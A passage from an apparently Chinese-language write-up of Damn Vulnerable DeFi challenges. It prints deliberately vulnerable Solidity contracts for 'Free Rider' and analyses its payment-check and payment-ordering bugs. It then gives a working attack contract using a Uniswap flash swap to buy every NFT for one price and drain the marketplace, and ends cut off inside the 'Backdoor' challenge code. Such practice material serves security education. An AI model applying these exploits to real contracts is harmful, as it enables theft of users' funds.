<h4 id="Code-9"><a href="#Code-9" class="headerlink" title="Code"></a>Code</h4><h5 id="FreeRiderRecovery-sol"><a href="#FreeRiderRecovery-sol" class="headerlink" title="FreeRiderRecovery.sol"></a>FreeRiderRecovery.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/IERC721.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title FreeRiderRecovery</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver &#123;</span><br><span class="line">    using Address for address payable;</span><br><span class="line"></span><br><span class="line">    uint256 private constant PRIZE = 45 ether;</span><br><span class="line">    address private immutable beneficiary;</span><br><span class="line">    IERC721 private immutable nft;</span><br><span class="line">    uint256 private received;</span><br><span class="line"></span><br><span class="line">    error NotEnoughFunding();</span><br><span class="line">    error CallerNotNFT();</span><br><span class="line">    error OriginNotBeneficiary();</span><br><span class="line">    error InvalidTokenID(uint256 tokenId);</span><br><span class="line">    error StillNotOwningToken(uint256 tokenId);</span><br><span class="line"></span><br><span class="line">    constructor(address _beneficiary, address _nft) payable &#123;</span><br><span class="line">        if (msg.value != PRIZE)</span><br><span class="line">            revert NotEnoughFunding();</span><br><span class="line">        beneficiary = _beneficiary;</span><br><span class="line">        nft = IERC721(_nft);</span><br><span class="line">        IERC721(_nft).setApprovalForAll(msg.sender, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function</span><br><span class="line">    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)</span><br><span class="line">        external</span><br><span class="line">        override</span><br><span class="line">        nonReentrant</span><br><span class="line">        returns (bytes4)</span><br><span class="line">    &#123;</span><br><span class="line">        if (msg.sender != address(nft))</span><br><span class="line">            revert CallerNotNFT();</span><br><span class="line"></span><br><span class="line">        if (tx.origin != beneficiary)</span><br><span class="line">            revert OriginNotBeneficiary();</span><br><span class="line"></span><br><span class="line">        if (_tokenId &gt; 5)</span><br><span class="line">            revert InvalidTokenID(_tokenId);</span><br><span class="line"></span><br><span class="line">        if (nft.ownerOf(_tokenId) != address(this))</span><br><span class="line">            revert StillNotOwningToken(_tokenId);</span><br><span class="line"></span><br><span class="line">        if (++received == 6) &#123;</span><br><span class="line">            address recipient = abi.decode(_data, (address));</span><br><span class="line">            payable(recipient).sendValue(PRIZE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return IERC721Receiver.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="FreeRiderNFTMarketplace-sol"><a href="#FreeRiderNFTMarketplace-sol" class="headerlink" title="FreeRiderNFTMarketplace.sol"></a>FreeRiderNFTMarketplace.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableNFT.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title FreeRiderNFTMarketplace</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract FreeRiderNFTMarketplace is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address payable;</span><br><span class="line"></span><br><span class="line">    DamnValuableNFT public token;</span><br><span class="line">    uint256 public offersCount;</span><br><span class="line"></span><br><span class="line">    // tokenId -&gt; price</span><br><span class="line">    mapping(uint256 =&gt; uint256) private offers;</span><br><span class="line"></span><br><span class="line">    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);</span><br><span class="line">    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);</span><br><span class="line"></span><br><span class="line">    error InvalidPricesAmount();</span><br><span class="line">    error InvalidTokensAmount();</span><br><span class="line">    error InvalidPrice();</span><br><span class="line">    error CallerNotOwner(uint256 tokenId);</span><br><span class="line">    error InvalidApproval();</span><br><span class="line">    error TokenNotOffered(uint256 tokenId);</span><br><span class="line">    error InsufficientPayment();</span><br><span class="line"></span><br><span class="line">    constructor(uint256 amount) payable &#123;</span><br><span class="line">        DamnValuableNFT _token = new DamnValuableNFT();</span><br><span class="line">        _token.renounceOwnership();</span><br><span class="line">        for (uint256 i = 0; i &lt; amount; ) &#123;</span><br><span class="line">            _token.safeMint(msg.sender);</span><br><span class="line">            unchecked &#123; ++i; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        token = _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant &#123;</span><br><span class="line">        uint256 amount = tokenIds.length;</span><br><span class="line">        if (amount == 0)</span><br><span class="line">            revert InvalidTokensAmount();</span><br><span class="line">            </span><br><span class="line">        if (amount != prices.length)</span><br><span class="line">            revert InvalidPricesAmount();</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; amount;) &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _offerOne(tokenIds[i], prices[i]);</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _offerOne(uint256 tokenId, uint256 price) private &#123;</span><br><span class="line">        DamnValuableNFT _token = token; // gas savings</span><br><span class="line"></span><br><span class="line">        if (price == 0)</span><br><span class="line">            revert InvalidPrice();</span><br><span class="line"></span><br><span class="line">        if (msg.sender != _token.ownerOf(tokenId))</span><br><span class="line">            revert CallerNotOwner(tokenId);</span><br><span class="line"></span><br><span class="line">        if (_token.getApproved(tokenId) != address(this) &amp;&amp; !_token.isApprovedForAll(msg.sender, address(this)))</span><br><span class="line">            revert InvalidApproval();</span><br><span class="line"></span><br><span class="line">        offers[tokenId] = price;</span><br><span class="line"></span><br><span class="line">        assembly &#123; // gas savings</span><br><span class="line">            sstore(0x02, add(sload(0x02), 0x01))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit NFTOffered(msg.sender, tokenId, price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; tokenIds.length;) &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _buyOne(tokenIds[i]);</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _buyOne(uint256 tokenId) private &#123;</span><br><span class="line">        uint256 priceToPay = offers[tokenId];</span><br><span class="line">        if (priceToPay == 0)</span><br><span class="line">            revert TokenNotOffered(tokenId);</span><br><span class="line"></span><br><span class="line">        if (msg.value &lt; priceToPay)</span><br><span class="line">            revert InsufficientPayment();</span><br><span class="line"></span><br><span class="line">        --offersCount;</span><br><span class="line"></span><br><span class="line">        // transfer from seller to buyer</span><br><span class="line">        DamnValuableNFT _token = token; // cache for gas savings</span><br><span class="line">        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);</span><br><span class="line"></span><br><span class="line">        // pay seller using cached token</span><br><span class="line">        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);</span><br><span class="line"></span><br><span class="line">        emit NFTBought(msg.sender, tokenId, priceToPay);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-9"><a href="#Analysis-9" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题卡了我非常之久，原因还是代码写的不够熟练，而这道题的问题其实很简单，有两个，一个是在<code>FreeRiderNFTMarketplace</code>这个合约中的<code>buyMany()</code>函数，在这个函数中当<code>tokenIds[]</code>的长度大于<code>1</code>，这个问题就会显现出来，因为当长度大于<code>1</code>时这个函数会多次调用<code>_buyOne()</code>函数，而这个函数中比较的是<code>msg.value</code>和单个<code>NFT</code>的价格，所以我们只需要一份的钱就可以购买多个<code>NFT</code>.</p>
<p>而第二个问题就是存在于<code>_buyOne()</code>当中，我们可以看到在这个函数中，是先将<code>NFT</code>给了购买者，再将钱转给<code>NFT</code>的所有者，而问题是此时<code>NFT</code>的所有者已经是购买者，所以钱也会给到购买者，而当我们一次性购买多个<code>NFT</code>的时候，我们就可以将这个池子中的<code>ETH</code>也掏走，而接下来就是购买资金的问题，我们可以通过<code>uniswapv2</code>来借贷<code>weth</code>代币，再将其转换成<code>ETH</code>，最终再利用多得的<code>ETH</code>还利息</p>
<h4 id="Attack-9"><a href="#Attack-9" class="headerlink" title="Attack"></a>Attack</h4><h5 id="FreeRiderNFTMarketplaceAttack-sol"><a href="#FreeRiderNFTMarketplaceAttack-sol" class="headerlink" title="FreeRiderNFTMarketplaceAttack.sol"></a>FreeRiderNFTMarketplaceAttack.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../DamnValuableNFT.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/IERC721.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol&quot;;</span><br><span class="line">import &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol&quot;;</span><br><span class="line">import &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;;</span><br><span class="line">import &quot;solmate/src/tokens/WETH.sol&quot;;</span><br><span class="line">import &quot;./FreeRiderNFTMarketplace.sol&quot;;</span><br><span class="line">import &quot;./FreeRiderRecovery.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract FreeRiderNFTMarketplaceAttack is IUniswapV2Callee, IERC721Receiver&#123;</span><br><span class="line">    address public nft;</span><br><span class="line">    address payable market;</span><br><span class="line">    address  public pair;</span><br><span class="line">    FreeRiderRecovery public recovery;</span><br><span class="line">    address payable weth;</span><br><span class="line">    uint256 public length=0;</span><br><span class="line">    address public player;</span><br><span class="line">    constructor(address _nft, address payable _market, address _pair, address _recovery, address payable _weth, address _player)&#123;</span><br><span class="line">        nft = _nft;</span><br><span class="line">        market = _market;</span><br><span class="line">        pair = _pair;</span><br><span class="line">        recovery = FreeRiderRecovery(_recovery);</span><br><span class="line">        weth = _weth;</span><br><span class="line">        player = _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Loan(uint256 amount) public&#123;</span><br><span class="line">        bytes memory data = abi.encode(amount);</span><br><span class="line">        length=data.length;</span><br><span class="line">        IUniswapV2Pair(pair).swap(amount,0,address(this),data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external&#123;</span><br><span class="line">        uint256[] memory tokenIds = new uint256[](6);</span><br><span class="line">        for(uint i=0 ; i&lt;6 ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            tokenIds[i]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 bala = WETH(weth).balanceOf(address(this));</span><br><span class="line">        WETH(weth).withdraw(bala);</span><br><span class="line">        FreeRiderNFTMarketplace(market).buyMany&#123;value: 15 ether&#125;(tokenIds);</span><br><span class="line">        for(uint a=0; a&lt;6; a++)</span><br><span class="line">        &#123;</span><br><span class="line">            bytes memory _data = abi.encode(player);</span><br><span class="line">            DamnValuableNFT(nft).safeTransferFrom(address(this),address(recovery),a,_data);</span><br><span class="line">        &#125;</span><br><span class="line">        WETH(weth).deposit&#123;value: 20 ether&#125;();</span><br><span class="line">        uint256 bala2 =WETH(weth).balanceOf(address(this));</span><br><span class="line">        WETH(weth).transfer(pair,bala2);</span><br><span class="line">        payable(player).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)</span><br><span class="line">        external</span><br><span class="line">        override</span><br><span class="line">        returns (bytes4)</span><br><span class="line">    &#123;</span><br><span class="line">        return IERC721Receiver.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="js-6"><a href="#js-6" class="headerlink" title="js"></a>js</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> attack = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;FreeRiderNFTMarketplaceAttack&quot;</span>,player)).<span class="title function_">deploy</span>(nft.<span class="property">address</span>,marketplace.<span class="property">address</span>,uniswapPair.<span class="property">address</span>,devsContract.<span class="property">address</span>,weth.<span class="property">address</span>,player.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> attack.<span class="title function_">connect</span>(player).<span class="title class_">Loan</span>(<span class="variable constant_">NFT_PRICE</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Challenge-11-Backdoor"><a href="#Challenge-11-Backdoor" class="headerlink" title="Challenge #11 - Backdoor"></a>Challenge #11 - Backdoor</h3><p>To incentivize the creation of more secure wallets in their team, someone has deployed a registry of <a target="_blank" rel="noopener" href="https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol">Gnosis Safe wallets</a>. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.</p>
<p>To make sure everything is safe and sound, the registry tightly integrates with the legitimate <a target="_blank" rel="noopener" href="https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol">Gnosis Safe Proxy Factory</a>, and has some additional safety checks.</p>
<p>Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.</p>
<p>Your goal is to take all funds from the registry. In a single transaction.</p>
<h4 id="Code-10"><a href="#Code-10" class="headerlink" title="Code"></a>Code</h4><h5 id="WalletRegistry-sol"><a href="#WalletRegistry-sol" class="headerlink" title="WalletRegistry.sol"></a>WalletRegistry.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;solady/src/auth/Ownable.sol&quot;;</span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title WalletRegistry</span><br><span class="line"> * @notice A registry for Gnosis Safe wallets.</span><br><span class="line"> *            When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.</span><br><span class="line"> * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract WalletRegistry is IProxyCreationCallback, Ownable &#123;</span><br><span class="line">    uint256 private constant EXPECTED_OWNERS_COUNT = 1;</span><br><span class="line">    uint256 private constant EXPECTED_THRESHOLD = 1;</span><br><span class="line">    uint256 private constant PAYMENT_AMOUNT = 10 ether;</span><br><span class="line"></span><br><span class="line">    address public immutable masterCopy;</span><br><span class="line">    address public immutable walletFactory;</span><br><span class="line">    IERC20 public immutable token;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; bool) public beneficiaries;</span><br><span class="line"></span><br><span class="line">    // owner =&gt; wallet</span><br><span class="line">    mapping(address =&gt; address) public wallets;</span><br><span class="line"></span><br><span class="line">    error NotEnoughFunds();</span><br><span class="line">    error CallerNotFactory();</span><br><span class="line">    error FakeMasterCopy();</span><br><span class="line">    error InvalidInitialization();</span><br><span class="line">    error InvalidThreshold(uint256 threshold);</span><br><span class="line">    error InvalidOwnersCount(uint256 count);</span><br><span class="line">    error OwnerIsNotABeneficiary();</span><br><span class="line">    error InvalidFallbackManager(address fallbackManager);</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address masterCopyAddress,</span><br><span class="line">        address walletFactoryAddress,</span><br><span class="line">        address tokenAddress,</span><br><span class="line">        address[] memory initialBeneficiaries</span><br><span class="line">    ) &#123;</span><br><span class="line">        _initializeOwner(msg.sender);</span><br><span class="line"></span><br><span class="line">        masterCopy = masterCopyAddress;</span><br><span class="line">        walletFactory = walletFactoryAddress;</span><br><span class="line">        token = IERC20(tokenAddress);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; initialBeneficiaries.length;) &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                beneficiaries[initialBeneficiaries[i]] = true;</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addBeneficiary(address beneficiary) external onlyOwner &#123;</span><br><span class="line">        beneficiaries[beneficiary] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback</span><br><span class="line">     *          setting the registry&#x27;s address as the callback.</span><br><span class="line">     */</span><br><span class="line">    function proxyCreated(GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256)</span><br><span class="line">        external</span><br><span class="line">        override</span><br><span class="line">    &#123;</span><br><span class="line">        if (token.balanceOf(address(this)) &lt; PAYMENT_AMOUNT) &#123; // fail early</span><br><span class="line">            revert NotEnoughFunds();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        address payable walletAddress = payable(proxy);</span><br><span class="line"></span><br><span class="line">        // Ensure correct factory and master copy</span><br><span class="line">        if (msg.sender != walletFactory) &#123;</span><br><span class="line">            revert CallerNotFactory();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (singleton != masterCopy) &#123;</span><br><span class="line">            revert FakeMasterCopy();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Ensure initial calldata was a call to `GnosisSafe::setup`</span><br><span class="line">        if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) &#123;</span><br><span class="line">            revert InvalidInitialization();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Ensure wallet initialization is the expected</span><br><span class="line">        uint256 threshold = GnosisSafe(walletAddress).getThreshold();</span><br><span class="line">        if (threshold != EXPECTED_THRESHOLD) &#123;</span><br><span class="line">            revert InvalidThreshold(threshold);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        address[] memory owners = GnosisSafe(walletAddress).getOwners();</span><br><span class="line">        if (owners.length != EXPECTED_OWNERS_COUNT) &#123;</span><br><span class="line">            revert InvalidOwnersCount(owners.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Ensure the owner is a registered beneficiary</span><br><span class="line">        address walletOwner;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            walletOwner = owners[0];</span><br><span class="line">        &#125;</span><br><span class="line">        if (!beneficiaries[walletOwner]) &#123;</span><br><span class="line">            revert OwnerIsNotABeneficiary();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        address fallbackManager = _getFallbackManager(walletAddress);</span><br><span class="line">        if (fallbackManager != address(0))</span><br><span class="line">            revert InvalidFallbackManager(fallbackManager);</span><br><span class="line"></span><br><span class="line">        // Remove owner as beneficiary</span><br><span class="line">        beneficiaries[walletOwner] = false;</span><br><span class="line"></span><br><span class="line">        // Register the wallet under the owner&#x27;s address</span><br><span class="line">        wallets[walletOwner] = walletAddress;</span><br><span class="line"></span><br><span class="line">        // Pay tokens to the newly created wallet</span><br><span class="line">        SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _getFallbackManager(address payable wallet) private view returns (address) &#123;</span><br><span class="line">        return abi.decode(</span><br><span class="line">            GnosisSafe(wallet).getStorageAt(</span><br><span class="line">                